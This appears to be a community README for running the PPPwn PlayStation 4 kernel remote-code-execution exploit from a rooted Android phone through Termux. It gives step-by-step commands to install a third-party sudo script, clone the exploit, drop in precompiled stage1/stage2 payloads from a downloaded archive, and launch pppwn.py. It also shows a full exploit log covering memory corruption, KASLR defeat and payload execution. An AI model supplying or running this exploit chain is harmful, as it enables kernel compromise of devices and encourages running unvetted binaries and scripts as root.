# PPPwn - PlayStation 4 PPPoE RCE
PPPwn is a kernel remote code execution exploit for PlayStation 4 up to FW 11.00. This is a proof-of-concept exploit for [CVE-2006-4304](https://hackerone.com/reports/2177925) that was reported responsibly to PlayStation.

Supported versions are:
- FW 9.00
- FW 9.03 / 9.04
- FW 9.50 / 9.60
- FW 10.00 / 10.01
- FW 10.50 / 10.70 / 10.71
- FW 11.00
- more can be added (PRs are welcome)

The exploit only prints `PPPwned` on your PS4 as a proof-of-concept. In order to launch Mira or similar homebrew enablers, the `stage2.bin` payload needs to be adapted.


## Requirements
- !!rooted Phone!!
- an adapter Ethernet port for phone
- Ethernet cable
- termux
- free storage 3gb or hight
  
## Usage

open termux and setup this command one by one:

1.
```sh
apt update && apt upgrade
```
2.
```sh
pkg install root-repo
```
3.
```sh
pkg install x11-repo
```
4.
```sh
pkg install git
```
5.
```sh
pkg install  python-pip
```
6.
```sh
apt install vim 
```
7.
```sh
apt install clang 
```
8. before this command open termux app and allow storage
```sh
termux-setup-storage
```
9.
```sh
pkg install tsu
```
10.
```sh
git clone https://gitlab.com/st42/termux-sudo
```
11.
```sh
cd termux-sudo
```
12.
```sh
cat sudo > /data/data/com.termux/files/usr/bin/sudo
```
13.
```sh
chmod 700 /data/data/com.termux/files/usr/bin/sudo
```
14.
```sh
cd storage/emulated/0
```
-note: if this message show ( bash: cd: storage/emulated/0 : No such file or directory) tap this:
```sh
cd storage/shared
```
15.
```sh
mkdir test && cd test
```
16.
```sh
git clone --recursive https://github.com/TheOfficialFloW/PPPwn
```

Change the directory to the cloned repository:

```sh
cd PPPwn
```

Install the requirements:

```sh
sudo pip install -r requirements.txt
```

-Compile the payloads:

we well use the file from mcrump special thank for him!

-Download the `PPPwn.rar` from [here](https://github.com/mbcrump/PPPwn-Windows-Instructions/blob/main/compiled-binaries/PPPwn.rar) site and copy the `stage1` and `stage2` folder to where you installed the exploit overwritting any files./ go on folder test/PPPwn .

For other firmwares, e.g. FW 9.00, pass `FW=900`.

Run the exploit (see `ifconfig` for the correct interface):

```sh
sudo python3 pppwn.py --interface=Ethernet --fw=1100
```

For other firmwares, e.g. FW 9.00, pass `--fw=900`.

On your PS4:

- Go to `Settings` and then `Network`
- Select `Set Up Internet connection` and choose `Use a LAN Cable`
- Choose `Custom` setup and choose `PPPoE` for `IP Address Settings`
- Enter anything for `PPPoE User ID` and `PPPoE Password`
- Choose `Automatic` for `DNS Settings` and `MTU Settings`
- Choose `Do Not Use` for `Proxy Server`
- Click `Test Internet Connection` to communicate with your computer

If the exploit fails or the PS4 crashes, you can skip the internet setup and simply click on `Test Internet Connection`. If the `pppwn.py` script is stuck waiting for a request/response, abort it and run it again on your computer, and then click on `Test Internet Connection` on your PS4.

If the exploit works, you should see an output similar to below, and you should see `Cannot connect to network.` 
followed by `PPPwned` printed on your PS4.

### NOTE: THIS SOMETIMES WORK SOMETIMES NOT IT UNDER THE DEVELOPMENT SO ENJOY IT

### Example run

```sh
[+] PPPwn - PlayStation 4 PPPoE RCE by theflow
[+] args: interface=enp0s3 fw=1100 stage1=stage1/stage1.bin stage2=stage2/stage2.bin

[+] STAGE 0: Initialization
[*] Waiting for PADI...
[+] pppoe_softc: 0xffffabd634beba00
[+] Target MAC: xx:xx:xx:xx:xx:xx
[+] Source MAC: 07:ba:be:34:d6:ab
[+] AC cookie length: 0x4e0
[*] Sending PADO...
[*] Waiting for PADR...
[*] Sending PADS...
[*] Waiting for LCP configure request...
[*] Sending LCP configure ACK...
[*] Sending LCP configure request...
[*] Waiting for LCP configure ACK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure NAK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure ACK...
[*] Sending IPCP configure request...
[*] Waiting for IPCP configure ACK...
[*] Waiting for interface to be ready...
[+] Target IPv6: fe80::2d9:d1ff:febc:83e4
[+] Heap grooming...done

[+] STAGE 1: Memory corruption
[+] Pinning to CPU 0...done
[*] Sending malicious LCP configure request...
[*] Waiting for LCP configure request...
[*] Sending LCP configure ACK...
[*] Sending LCP configure request...
[*] Waiting for LCP configure ACK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure NAK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure ACK...
[*] Sending IPCP configure request...
[*] Waiting for IPCP configure ACK...
[+] Scanning for corrupted object...found fe80::0fdf:4141:4141:4141

[+] STAGE 2: KASLR defeat
[*] Defeating KASLR...
[+] pppoe_softc_list: 0xffffffff884de578
[+] kaslr_offset: 0x3ffc000

[+] STAGE 3: Remote code execution
[*] Sending LCP terminate request...
[*] Waiting for PADI...
[+] pppoe_softc: 0xffffabd634beba00
[+] Target MAC: xx:xx:xx:xx:xx:xx
[+] Source MAC: 97:df:ea:86:ff:ff
[+] AC cookie length: 0x511
[*] Sending PADO...
[*] Waiting for PADR...
[*] Sending PADS...
[*] Triggering code execution...
[*] Waiting for stage1 to resume...
[*] Sending PADT...
[*] Waiting for PADI...
[+] pppoe_softc: 0xffffabd634be9200
[+] Target MAC: xx:xx:xx:xx:xx:xx
[+] AC cookie length: 0x0
[*] Sending PADO...
[*] Waiting for PADR...
[*] Sending PADS...
[*] Waiting for LCP configure request...
[*] Sending LCP configure ACK...
[*] Sending LCP configure request...
[*] Waiting for LCP configure ACK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure NAK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure ACK...
[*] Sending IPCP configure request...
[*] Waiting for IPCP configure ACK...

[+] STAGE 4: Arbitrary payload execution
[*] Sending stage2 payload...
[+] Done!
```

## special thanks for the flow and mcrump and lighting mode.
